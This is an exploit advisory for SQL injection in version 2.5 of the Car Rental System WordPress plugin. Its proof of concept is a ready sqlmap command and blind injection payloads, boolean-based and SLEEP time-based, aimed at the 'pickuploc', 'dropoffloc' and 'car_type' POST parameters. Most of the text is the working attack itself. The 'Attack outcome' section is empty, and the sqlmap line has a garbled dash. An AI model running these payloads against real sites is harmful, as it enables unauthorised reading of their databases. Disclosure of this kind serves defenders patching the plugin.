1. Description

An unescaped parameter was found in Car Rental System v2.5 (WP plugin). An attacker can exploit this vulnerability to read from the database.
The POST parameters 'pickuploc', 'dropoffloc', and 'car_type' are vulnerable.

2. Proof of concept

sqlmap -u "http://server/wp-car/" â€”data="pickuploc=2&dropoffloc=1&car_type=&pickup=03/08/2017&pickUpTime=09:00:00&dropoff=03/18/2017&dropoffTime=09:00:00&btn_room_search=" --dbs --threads=5 --random-agent

Parameter: pickuploc (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: pickuploc=2 AND 3834=3834&dropoffloc=1&car_type=&pickup=03/08/2017&pickUpTime=09:00:00&dropoff=03/18/2017&dropoffTime=09:00:00&btn_room_search=

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: pickuploc=2 AND SLEEP(5)&dropoffloc=1&car_type=&pickup=03/08/2017&pickUpTime=09:00:00&dropoff=03/18/2017&dropoffTime=09:00:00&btn_room_search=

The same is applicable for 'dropoffloc' and 'car_type' parameters


3. Attack outcome:
